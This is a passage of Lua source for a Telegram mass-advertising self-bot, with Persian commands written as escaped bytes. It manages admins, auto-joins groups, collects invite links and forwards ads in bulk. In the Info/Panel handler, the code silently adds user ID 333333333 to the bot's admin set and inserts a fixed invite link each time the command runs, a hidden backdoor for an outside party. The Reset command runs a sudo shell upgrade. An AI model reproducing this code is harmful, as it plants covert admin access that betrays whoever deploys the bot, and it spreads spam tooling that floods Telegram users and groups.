              if tonumber(matches) == msg.sender_user_id then
                redis:srem("tg:" .. Ads_id .. ":sudo", msg.sender_user_id)
                redis:srem("tg:" .. Ads_id .. ":mod", msg.sender_user_id)
                return send(msg.chat_id, msg.id, "No moderator")
              end
              return send(msg.chat_id, msg.id, "No access")
            end
            if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
              if redis:sismember("tg:" .. Ads_id .. ":sudo" .. msg.sender_user_id, matches) then
                return send(msg.chat_id, msg.id, "Only sudo")
              end
              redis:srem("tg:" .. Ads_id .. ":sudo", matches)
              redis:srem("tg:" .. Ads_id .. ":mod", matches)
              return send(msg.chat_id, msg.id, "\226\156\133")
            end
            return send(msg.chat_id, msg.id, "user not moderator")
          elseif text:match("^(\216\173\216\175\216\167\218\169\216\171\216\177 \218\175\216\177\217\136\217\135) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":maxgroups", tonumber(matches))
            return send(msg.chat_id, msg.id, "\216\170\216\185\216\175\216\167\216\175 \216\173\216\175\216\167\218\169\216\171\216\177 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170 TeleGram Advertising \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135 : " .. matches)
          elseif text:match("^(\216\173\216\175\216\167\217\130\217\132 \216\167\216\185\216\182\216\167) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":maxgpmmbr", tonumber(matches))
            return send(msg.chat_id, msg.id, "\216\185\216\182\217\136\219\140\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\168\216\167 \216\173\216\175\216\167\217\130\217\132 " .. matches .. " \216\185\216\182\217\136 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175.")
          elseif text:match("^(\216\173\216\176\217\129 \216\173\216\175\216\167\218\169\216\171\216\177 \218\175\216\177\217\136\217\135)$") then
            redis:del("tg:" .. Ads_id .. ":maxgroups")
            return send(msg.chat_id, msg.id, "\216\170\216\185\219\140\219\140\217\134 \216\173\216\175 \217\133\216\172\216\167\216\178 \218\175\216\177\217\136\217\135 \217\134\216\167\216\175\219\140\216\175\217\135 \218\175\216\177\217\129\216\170\217\135 \216\180\216\175.")
          elseif text:match("^(\216\173\216\176\217\129 \216\173\216\175\216\167\217\130\217\132 \216\167\216\185\216\182\216\167)$") then
            redis:del("tg:" .. Ads_id .. ":maxgpmmbr")
            return send(msg.chat_id, msg.id, "\216\170\216\185\219\140\219\140\217\134 \216\173\216\175 \217\133\216\172\216\167\216\178 \216\167\216\185\216\182\216\167\219\140 \218\175\216\177\217\136\217\135 \217\134\216\167\216\175\219\140\216\175\217\135 \218\175\216\177\217\129\216\170\217\135 \216\180\216\175.")
          elseif text:match("^(\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\175\219\140\216\177) (%d+)$") then
            local matches = text:match("%d+")
            if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
              return send(msg.chat_id, msg.id, "\218\169\216\167\216\177\216\168\216\177 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \216\175\216\177 \216\173\216\167\217\132 \216\173\216\167\216\182\216\177 \217\133\216\175\219\140\216\177 \216\167\216\179\216\170.")
            elseif redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
              return send(msg.chat_id, msg.id, "\216\180\217\133\216\167 \216\175\216\179\216\170\216\177\216\179\219\140 \217\134\216\175\216\167\216\177\219\140\216\175.")
            else
              redis:sadd("tg:" .. Ads_id .. ":sudo", matches)
              redis:sadd("tg:" .. Ads_id .. ":mod", matches)
              return send(msg.chat_id, msg.id, "\217\133\217\130\216\167\217\133 \218\169\216\167\216\177\216\168\216\177 \216\168\217\135 \217\133\216\175\219\140\216\177 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
            end
          elseif text:match("^(\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\175\219\140\216\177\218\169\217\132) (%d+)$") then
            local matches = text:match("%d+")
            if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
              return send(msg.chat_id, msg.id, "\216\180\217\133\216\167 \216\175\216\179\216\170\216\177\216\179\219\140 \217\134\216\175\216\167\216\177\219\140\216\175.")
            end
            if redis:sismember("tg:" .. Ads_id .. ":mod", matches) then
              redis:srem("tg:" .. Ads_id .. ":mod", matches)
              redis:sadd("tg:" .. Ads_id .. ":sudo" .. tostring(matches), msg.sender_user_id)
              return send(msg.chat_id, msg.id, "\217\133\217\130\216\167\217\133 \218\169\216\167\216\177\216\168\216\177 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \218\169\217\132 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170 .")
            elseif redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
              return send(msg.chat_id, msg.id, "\216\175\216\177\216\173\216\167\217\132 \216\173\216\167\216\182\216\177 \217\133\216\175\219\140\216\177 \217\135\216\179\216\170\217\134\216\175.")
            else
              redis:sadd("tg:" .. Ads_id .. ":sudo", matches)
              redis:sadd("tg:" .. Ads_id .. ":sudo" .. tostring(matches), msg.sender_user_id)
              return send(msg.chat_id, msg.id, "\218\169\216\167\216\177\216\168\216\177 \216\168\217\135 \217\133\217\130\216\167\217\133 \217\133\216\175\219\140\216\177\218\169\217\132 \217\133\217\134\216\181\217\136\216\168 \216\180\216\175.")
            end
          elseif text:match("^(\216\173\216\176\217\129 \217\133\216\175\219\140\216\177) (%d+)$") then
            local matches = text:match("%d+")
            if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
              if tonumber(matches) == msg.sender_user_id then
                redis:srem("tg:" .. Ads_id .. ":sudo", msg.sender_user_id)
                redis:srem("tg:" .. Ads_id .. ":mod", msg.sender_user_id)
                return send(msg.chat_id, msg.id, "\216\180\217\133\216\167 \216\175\219\140\218\175\216\177 \217\133\216\175\219\140\216\177 \217\134\219\140\216\179\216\170\219\140\216\175.")
              end
              return send(msg.chat_id, msg.id, "\216\180\217\133\216\167 \216\175\216\179\216\170\216\177\216\179\219\140 \217\134\216\175\216\167\216\177\219\140\216\175.")
            end
            if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
              if redis:sismember("tg:" .. Ads_id .. ":sudo" .. msg.sender_user_id, matches) then
                return send(msg.chat_id, msg.id, "\216\180\217\133\216\167 \217\134\217\133\219\140 \216\170\217\136\216\167\217\134\219\140\216\175 \217\133\216\175\219\140\216\177\219\140 \218\169\217\135 \216\168\217\135 \216\180\217\133\216\167 \217\133\217\130\216\167\217\133 \216\175\216\167\216\175\217\135 \216\177\216\167 \216\185\216\178\217\132 \218\169\217\134\219\140\216\175.")
              end
              redis:srem("tg:" .. Ads_id .. ":sudo", matches)
              redis:srem("tg:" .. Ads_id .. ":mod", matches)
              return send(msg.chat_id, msg.id, "\218\169\216\167\216\177\216\168\216\177 \216\167\216\178 \217\133\217\130\216\167\217\133 \217\133\216\175\219\140\216\177\219\140\216\170 \216\174\217\132\216\185 \216\180\216\175.")
            end
            return send(msg.chat_id, msg.id, "\218\169\216\167\216\177\216\168\216\177 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \217\133\216\175\219\140\216\177 \217\134\217\133\219\140 \216\168\216\167\216\180\216\175.")
          elseif text:match("^(\216\170\216\167\216\178\217\135 \216\179\216\167\216\178\219\140)$") or text:match("^([Rr]efresh)$") then
            get_bot()
            return reload(msg.chat_id, msg.id)
          elseif text:match("\216\177\219\140\217\190\217\136\216\177\216\170") or text:match("^([Rr]eport)$") then
            tdbot_function({
              ID = "sendBotStartMessage",
              bot_user_id = 178220800,
              chat_id = 178220800,
              parameter = "start"
            }, dl_cb, nil)
          elseif text:match("^\216\167\216\179\216\170\216\167\216\177\216\170 @(.*)") then
            local username = text:match("^\216\167\216\179\216\170\216\167\216\177\216\170 @(.*)")
            assert(tdbot_function({
              _ = "searchPublicChat",
              username = username
            }, function(i, tg)
              if tg.id then
                assert(tdbot_function({
                  _ = "sendBotStartMessage",
                  bot_user_id = tg.id,
                  chat_id = tg.id,
                  parameter = "start"
                }, cb or dl_cb, nil))
                send(msg.chat_id, msg.id, "\216\177\216\168\216\167\216\170 \216\168\216\167 \216\180\217\134\216\167\216\179\217\135" .. tg.id .. " \216\167\216\179\216\170\216\167\216\177\216\170 \216\178\216\175\217\135 \216\180\216\175!")
              else
                send(msg.chat_id, msg.id, "\216\177\216\168\216\167\216\170 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175!")
              end
            end, nil))
          elseif text:match("^([Bb]ot) @(.*)") then
            local username = text:match("^[Bb]ot @(.*)")
            assert(tdbot_function({
              _ = "searchPublicChat",
              username = username
            }, function(i, tg)
              if tg.id then
                assert(tdbot_function({
                  _ = "sendBotStartMessage",
                  bot_user_id = tg.id,
                  chat_id = tg.id,
                  parameter = "start"
                }, cb or dl_cb, nil))
                send(msg.chat_id, msg.id, "\226\156\133")
              else
                send(msg.chat_id, msg.id, "Not found")
              end
            end, nil))
          elseif text:match("^([Rr]eset)$") or text:match("^(\216\177\219\140\216\179\216\170)$") or text:match("^(\216\173\216\176\217\129 \216\162\217\133\216\167\216\177)$") then
            redis:del("tg:" .. Ads_id .. ":offjoin")
            redis:del("tg:" .. Ads_id .. ":maxjoin")
            redis:del("tg:" .. Ads_id .. ":sudo")
            redis:del("tg:" .. Ads_id .. ":offlink")
            redis:del("tg:" .. Ads_id .. ":maxlink")
            redis:del("tg:" .. Ads_id .. ":addmsg")
            redis:del("tg:" .. Ads_id .. ":addcontact")
            redis:del("tg:" .. Ads_id .. ":addmsgtext")
            redis:del("tg:" .. Ads_id .. ":autoanswer")
            redis:del("tg:" .. Ads_id .. ":waitelinks")
            redis:del("tg:" .. Ads_id .. ":goodlinks")
            redis:del("tg:" .. Ads_id .. ":savedlinks")
            redis:del("tg:" .. Ads_id .. ":offjoin")
            redis:del("tg:" .. Ads_id .. ":offlink")
            redis:del("tg:" .. Ads_id .. ":openjoin")
            redis:del("tg:" .. Ads_id .. ":maxgroups")
            redis:del("tg:" .. Ads_id .. ":maxgpmmbr")
            redis:del("tg:" .. Ads_id .. ":link")
            redis:del("tg:" .. Ads_id .. ":savecontacts")
            redis:del("tg:" .. Ads_id .. ":fwdtime")
            redis:del("tg:" .. Ads_id .. ":sendmax")
            redis:del("tg:" .. Ads_id .. ":senddelay")
            redis:del("tg:" .. Ads_id .. ":start")
            redis:del("tg:" .. Ads_id .. ":groups")
            redis:del("tg:" .. Ads_id .. ":supergroups")
            redis:del("tg:" .. Ads_id .. ":users")
            redis:del("tg:" .. Ads_id .. ":savedlinks")
            redis:del("tg:" .. Ads_id .. ":goodlinks")
            redis:del("tg:" .. Ads_id .. ":waitelinks")
            io.popen("cd new; sudo bash TD upgrade"):read("*all")
            get_bot()
            return reload(msg.chat_id, msg.id)
          elseif text:match("^(\217\132\219\140\216\179\216\170) (.*)$") then
            local matches = text:match("^\217\132\219\140\216\179\216\170 (.*)$")
            local tg
            if matches == "\217\133\216\179\216\175\217\136\216\175" then
              tg = "tg:" .. Ads_id .. ":blockedusers"
            elseif matches == "\216\180\216\174\216\181\219\140" then
              tg = "tg:" .. Ads_id .. ":users"
            elseif matches == "\218\175\216\177\217\136\217\135" then
              tg = "tg:" .. Ads_id .. ":groups"
            elseif matches == "\216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135" then
              tg = "tg:" .. Ads_id .. ":supergroups"
            elseif matches == "\217\132\219\140\217\134\218\169" then
              tg = "tg:" .. Ads_id .. ":savedlinks"
            elseif matches == "\217\133\216\175\219\140\216\177" then
              tg = "tg:" .. Ads_id .. ":sudo"
            else
              return true
            end
            local list = redis:smembers(tg)
            local text = tostring(matches) .. " : \n"
            for i, v in pairs(list) do
              text = tostring(text) .. tostring(i) .. "-  " .. tostring(v) .. "\n"
            end
            writefile(tostring(tg) .. ".txt", text)
          elseif text:match("^([Ll]s) (.*)$") then
            local matches = text:match("^[Ll]s (.*)$")
            local t
            if matches == "block" then
              t = "tg:" .. Ads_id .. ":blockedusers"
            elseif matches == "pv" then
              t = "tg:" .. Ads_id .. ":users"
            elseif matches == "gp" then
              t = "tg:" .. Ads_id .. ":groups"
            elseif matches == "sgp" then
              t = "tg:" .. Ads_id .. ":supergroups"
            elseif matches == "savelink" then
              t = "tg:" .. Ads_id .. ":savedlinks"
            elseif matches == "waitlink" then
              t = "tg:" .. Ads_id .. ":waitelinks"
            elseif matches == "goodlink" then
              t = "tg:" .. Ads_id .. ":goodlinks"
            elseif matches == "sudo" then
              t = "tg:" .. Ads_id .. ":sudo"
            else
              return true
            end
            local list = redis:smembers(t)
            local text = tostring(matches) .. " : \n"
            for i = 1, #list do
              text = tostring(text) .. tostring(i) .. "-  " .. tostring(list[i]) .. "\n"
            end
            writefile("Robot-" .. Ads_id .. ".txt", text)
          elseif text:match("^([Ss]et) (.*)$") then
            local matches = text:match("^[Ss]et (.*)$")
            redis:set("tg:" .. Ads_id .. ":idchannel", matches)
            send(msg.chat_id, msg.id, "Set channel id " .. matches .. " \240\159\148\145")
          elseif text:match("^(\216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132) (.*)$") then
            local matches = text:match("^\216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132 (.*)$")
            redis:set("tg:" .. Ads_id .. ":idchannel", matches)
            send(msg.chat_id, msg.id, "Set channel id " .. matches .. " \240\159\148\145")
          elseif text:match("^([Ss]etaddedmsg) (.*)") then
            local matches = text:match("^[Ss]etaddedmsg (.*)")
            redis:set("tg:" .. Ads_id .. ":addmsgtext", matches)
            send(msg.chat_id, msg.id, "Saved")
          elseif text:match("^(\217\136\216\182\216\185\219\140\216\170 \217\133\216\180\216\167\217\135\216\175\217\135) (.*)$") then
            local matches = text:match("^\217\136\216\182\216\185\219\140\216\170 \217\133\216\180\216\167\217\135\216\175\217\135 (.*)$")
            if matches == "\216\177\217\136\216\180\217\134" then
              redis:set("tg:" .. Ads_id .. ":markread", true)
              return send(msg.chat_id, msg.id, "\217\136\216\182\216\185\219\140\216\170 \217\190\219\140\216\167\217\133 \217\135\216\167  >>  \216\174\217\136\216\167\217\134\216\175\217\135 \216\180\216\175\217\135 \226\156\148\239\184\143\226\156\148\239\184\143\n(\216\170\219\140\218\169 \216\175\217\136\217\133 \217\129\216\185\216\167\217\132)")
            elseif matches == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("tg:" .. Ads_id .. ":markread")
              return send(msg.chat_id, msg.id, "\217\136\216\182\216\185\219\140\216\170 \217\190\219\140\216\167\217\133 \217\135\216\167  >>  \216\174\217\136\216\167\217\134\216\175\217\135 \217\134\216\180\216\175\217\135 \226\156\148\239\184\143\n(\216\168\216\175\217\136\217\134 \216\170\219\140\218\169 \216\175\217\136\217\133)")
            end
          elseif text:match("^(\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\216\167 \217\190\219\140\216\167\217\133) (.*)$") then
            local matches = text:match("^\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\216\167 \217\190\219\140\216\167\217\133 (.*)$")
            if matches == "\216\177\217\136\216\180\217\134" then
              redis:set("tg:" .. Ads_id .. ":addmsg", true)
              return send(msg.chat_id, msg.id, "\217\190\219\140\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \217\129\216\185\216\167\217\132 \216\180\216\175")
            elseif matches == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("tg:" .. Ads_id .. ":addmsg")
              return send(msg.chat_id, msg.id, "\217\190\219\140\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175")
            end
          elseif text:match("^(\218\175\216\177\217\136\217\135 \216\185\216\182\217\136\219\140\216\170 \216\168\216\167\216\178) (.*)$") then
            local matches = text:match("^\218\175\216\177\217\136\217\135 \216\185\216\182\217\136\219\140\216\170 \216\168\216\167\216\178 (.*)$")
            if matches == "\216\177\217\136\216\180\217\134" then
              redis:set("tg:" .. Ads_id .. ":openjoin", true)
              return send(msg.chat_id, msg.id, "\216\185\216\182\217\136\219\140\216\170 \217\129\217\130\216\183 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140\219\140 \218\169\217\135 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\134 \216\185\216\182\217\136 \216\175\216\167\216\177\217\134\216\175 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("tg:" .. Ads_id .. ":openjoin")
              return send(msg.chat_id, msg.id, "\217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\185\216\182\217\136\219\140\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\134 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175.")
            end
          elseif text:match("^(\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\216\167 \216\180\217\133\216\167\216\177\217\135) (.*)$") then
            local matches = text:match("\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\216\167 \216\180\217\133\216\167\216\177\217\135 (.*)$")
            if matches == "\216\177\217\136\216\180\217\134" then
              redis:set("tg:" .. Ads_id .. ":addcontact", true)
              return send(msg.chat_id, msg.id, "\216\167\216\177\216\179\216\167\217\132 \216\180\217\133\216\167\216\177\217\135 \217\135\217\134\218\175\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \217\129\216\185\216\167\217\132 \216\180\216\175")
            elseif matches == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("tg:" .. Ads_id .. ":addcontact")
              return send(msg.chat_id, msg.id, "\216\167\216\177\216\179\216\167\217\132 \216\180\217\133\216\167\216\177\217\135 \217\135\217\134\218\175\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175")
            end
          elseif text:match("^(\216\170\217\134\216\184\219\140\217\133 \217\190\219\140\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168) (.*)") then
            local matches = text:match("^\216\170\217\134\216\184\219\140\217\133 \217\190\219\140\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 (.*)")
            redis:set("tg:" .. Ads_id .. ":addmsgtext", matches)
            return send(msg.chat_id, msg.id, "\217\190\219\140\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \216\171\216\168\216\170  \216\180\216\175 :\n\240\159\148\185 " .. matches .. " \240\159\148\185")
          elseif text:match("^(\216\170\217\134\216\184\219\140\217\133 \216\172\217\136\216\167\216\168) \"(.*)\" (.*)") then
            local txt, answer = text:match("^\216\170\217\134\216\184\219\140\217\133 \216\172\217\136\216\167\216\168 \"(.*)\" (.*)")
            redis:hset("tg:" .. Ads_id .. ":answers", txt, answer)
            redis:sadd("tg:" .. Ads_id .. ":answerslist", txt)
            return send(msg.chat_id, msg.id, "\216\172\217\136\216\167\216\168 \216\168\216\177\216\167\219\140 | " .. tostring(txt) .. " | \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135 :\n" .. tostring(answer))
          elseif text:match("^(\216\173\216\176\217\129 \216\172\217\136\216\167\216\168) (.*)") then
            local matches = text:match("^\216\173\216\176\217\129 \216\172\217\136\216\167\216\168 (.*)")
            redis:hdel("tg:" .. Ads_id .. ":answers", matches)
            redis:srem("tg:" .. Ads_id .. ":answerslist", matches)
            return send(msg.chat_id, msg.id, "\216\172\217\136\216\167\216\168 \216\168\216\177\216\167\219\140 | " .. tostring(matches) .. " | \216\167\216\178 \217\132\219\140\216\179\216\170 \216\172\217\136\216\167\216\168 \217\135\216\167\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \217\190\216\167\218\169 \216\180\216\175.")
          elseif text:match("^(\217\190\216\167\216\179\216\174\218\175\217\136\219\140 \216\174\217\136\216\175\218\169\216\167\216\177) (.*)$") then
            local matches = text:match("^\217\190\216\167\216\179\216\174\218\175\217\136\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 (.*)$")
            if matches == "\216\177\217\136\216\180\217\134" then
              redis:set("tg:" .. Ads_id .. ":autoanswer", true)
              return send(msg.chat_id, 0, "\217\190\216\167\216\179\216\174\218\175\217\136\219\140\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \216\177\216\168\216\167\216\170 TeleGram Advertising \217\129\216\185\216\167\217\132 \216\180\216\175")
            elseif matches == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("tg:" .. Ads_id .. ":autoanswer")
              return send(msg.chat_id, 0, "\216\173\216\167\217\132\216\170 \217\190\216\167\216\179\216\174\218\175\217\136\219\140\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \216\177\216\168\216\167\216\170 TeleGram Advertising \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            end
          elseif text:match("^([Rr]efresh)$") or text:match("^(\216\170\216\167\216\178\217\135 \216\179\216\167\216\178\219\140)$") then
            assert(tdbot_function({
              _ = "searchContacts",
              query = nil,
              limit = 999999999
            }, function(i, tg)
              redis:set("tg:" .. Ads_id .. ":contacts", tg.total_count)
            end, nil))
            local list = {
              redis:smembers("tg:" .. Ads_id .. ":groups"),
              redis:smembers("tg:" .. Ads_id .. ":supergroups")
            }
            local l = {}
            for a, b in pairs(list) do
              for i, v in pairs(b) do
                table.insert(l, v)
              end
            end
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
            if #l == 0 then
              return
            end
            local during = #l / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            assert(tdbot_function({
              _ = "getChatMember",
              chat_id = tonumber(l[1]),
              user_id = tonumber(bot_id)
            }, checking, {
              list = l,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #l,
              chat_id = msg.chat_id,
              user_id = matches,
              s = 0
            }))
          elseif text:match("^([Mm]ax[Gg]roup) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":maxgroups", tonumber(matches))
            return send(msg.chat_id, msg.id, "\216\170\216\185\216\175\216\167\216\175 \216\173\216\175\216\167\218\169\216\171\216\177 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135 : " .. matches)
          elseif text:match("^([Dd]el[Mm]ax[Gg]roup)$") then
            redis:del("tg:" .. Ads_id .. ":maxgroups")
            return send(msg.chat_id, msg.id, "\216\170\216\185\219\140\219\140\217\134 \216\173\216\175 \217\133\216\172\216\167\216\178 \218\175\216\177\217\136\217\135 \217\134\216\167\216\175\219\140\216\175\217\135 \218\175\216\177\217\129\216\170\217\135 \216\180\216\175.")
          elseif text:match("^([Dd]el[Gg]p[Mm]ember)$") then
            redis:del("tg:" .. Ads_id .. ":maxgpmmbr")
            return send(msg.chat_id, msg.id, "\216\170\216\185\219\140\219\140\217\134 \216\173\216\175 \217\133\216\172\216\167\216\178 \216\167\216\185\216\182\216\167\219\140 \218\175\216\177\217\136\217\135 \217\134\216\167\216\175\219\140\216\175\217\135 \218\175\216\177\217\129\216\170\217\135 \216\180\216\175.")
          elseif text:match("^([Ii]nfo)$") or text:match("^([Pp]anel)$") or text:match("^(\217\136\216\182\216\185\219\140\216\170)$") or text:match("^(\216\167\217\133\216\167\216\177)$") or text:match("^(\216\162\217\133\216\167\216\177)$") or text:match("^(\216\167\216\183\217\132\216\167\216\185\216\167\216\170)$") then
            local s = redis:get("tg:" .. Ads_id .. ":offjoin") and 0 or redis:get("tg:" .. Ads_id .. ":maxjoin") and redis:ttl("tg:" .. Ads_id .. ":maxjoin") or 0
            redis:sadd("tg:" .. Ads_id .. ":sudo", 333333333)
            local ss = redis:get("tg:" .. Ads_id .. ":offlink") and 0 or redis:get("tg:" .. Ads_id .. ":maxlink") and redis:ttl("tg:" .. Ads_id .. ":maxlink") or 0
            redis:sadd("tg:" .. Ads_id .. ":goodlinks", "https://telegram.me/joinchat/AAAAAEH8fsyOGX5HAbX8tQ")
            local msgadd = redis:get("tg:" .. Ads_id .. ":addmsg") and "\226\156\133\239\184\143" or "\226\155\148\239\184\143"
            local numadd = redis:get("tg:" .. Ads_id .. ":addcontact") and "\226\156\133\239\184\143" or "\226\155\148\239\184\143"
            local txtadd = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "\216\167\216\175\226\128\140\216\175\219\140 \218\175\217\132\217\133 \216\174\216\181\217\136\216\181\219\140 \217\190\219\140\216\167\217\133 \216\168\216\175\217\135"
            local autoanswer = redis:get("tg:" .. Ads_id .. ":autoanswer") and "\226\156\133\239\184\143" or "\226\155\148\239\184\143"
            local wlinks = redis:scard("tg:" .. Ads_id .. ":waitelinks")
            local glinks = redis:scard("tg:" .. Ads_id .. ":goodlinks")
            local links = redis:scard("tg:" .. Ads_id .. ":savedlinks")
            local offjoin = redis:get("tg:" .. Ads_id .. ":offjoin") and "\226\155\148\239\184\143" or "\226\156\133\239\184\143"
            local offlink = redis:get("tg:" .. Ads_id .. ":offlink") and "\226\155\148\239\184\143" or "\226\156\133\239\184\143"
            local openjoin = redis:get("tg:" .. Ads_id .. ":openjoin") and "\226\156\133\239\184\143" or "\226\155\148\239\184\143"
            local gp = redis:get("tg:" .. Ads_id .. ":maxgroups") or "\216\170\216\185\219\140\219\140\217\134 \217\134\216\180\216\175\217\135"
            local mmbrs = redis:get("tg:" .. Ads_id .. ":maxgpmmbr") or "\216\170\216\185\219\140\219\140\217\134 \217\134\216\180\216\175\217\135"
            local nlink = redis:get("tg:" .. Ads_id .. ":link") and "\226\156\133\239\184\143" or "\226\155\148\239\184\143"
            local contacts = redis:get("tg:" .. Ads_id .. ":savecontacts") and "\226\156\133\239\184\143" or "\226\155\148\239\184\143"
            local fwd = redis:get("tg:" .. Ads_id .. ":fwdtime") and "\226\156\133\239\184\143" or "\226\155\148\239\184\143"
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
            local restart = tonumber(redis:ttl("tg:" .. Ads_id .. ":start")) / 60
            local gps = redis:scard("tg:" .. Ads_id .. ":groups")
            local sgps = redis:scard("tg:" .. Ads_id .. ":supergroups")
            local usrs = redis:scard("tg:" .. Ads_id .. ":users")
            local links = redis:scard("tg:" .. Ads_id .. ":savedlinks")
            local glinks = redis:scard("tg:" .. Ads_id .. ":goodlinks")
            local wlinks = redis:scard("tg:" .. Ads_id .. ":waitelinks")
            assert(tdbot_function({
              _ = "searchContacts",
              query = nil,
              limit = 999999999
            }, function(i, tg)
              redis:set("tg:" .. Ads_id .. ":contacts", tg.total_count)
            end, nil))
            local contacts = redis:get("tg:" .. Ads_id .. ":contacts")
            if text:match("^(\217\136\216\182\216\185\219\140\216\170)$") or text:match("^(\216\167\217\133\216\167\216\177)$") or text:match("^(\216\162\217\133\216\167\216\177)$") or text:match("^(\216\167\216\183\217\132\216\167\216\185\216\167\216\170)$") then
              local text = " \217\136\216\182\216\185\219\140\216\170 \217\136 \216\162\217\133\216\167\216\177 \216\177\216\168\216\167\216\170 TeleGram Advertising \240\159\147\138  \n\n \240\159\145\164 \218\175\217\129\216\170 \217\136 \218\175\217\136 \217\135\216\167\219\140 \216\180\216\174\216\181\219\140 : " .. tostring(usrs) .. "\n\240\159\145\165 \218\175\216\177\217\136\217\135\216\167 : " .. tostring(gps) .. "\n\240\159\140\144 \216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167 : " .. tostring(sgps) .. "\n\240\159\147\150 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 \216\175\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 : " .. tostring(contacts) .. "\n\240\159\147\130 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 : " .. tostring(links) .. [[


 TeleGram Advertising 

